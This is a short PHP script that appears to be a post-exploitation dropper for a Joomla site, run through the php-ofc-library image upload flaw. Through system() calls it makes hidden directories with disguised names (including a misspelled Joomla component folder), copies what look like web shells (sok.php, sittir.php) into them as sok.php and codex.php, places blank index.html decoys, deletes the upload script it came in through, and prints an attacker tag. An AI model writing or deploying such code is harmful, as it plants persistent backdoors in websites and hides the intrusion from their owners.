<?php
  system("echo path > index.html");
  system("mkdir ../../../../../cache/sok");
  system("mkdir ../../../../../components/com_jooomlas");
  system("echo x > ../../../../../cache/sok/index.html");
  system("echo x > ../../../../../components/com_jooomlas/index.html");
  system("cp sok.php ../../../../../cache/sok/sok.php");
  system("cp sittir.php ../../../../../cache/sok/sok.php");
  system("cp sittir.php ../../../../../components/com_jooomlas/codex.php");
  system("cd ..; rm -rf php-ofc-library/ofc_upload_image.php");
  echo "iskorpitx" ; 
  ?>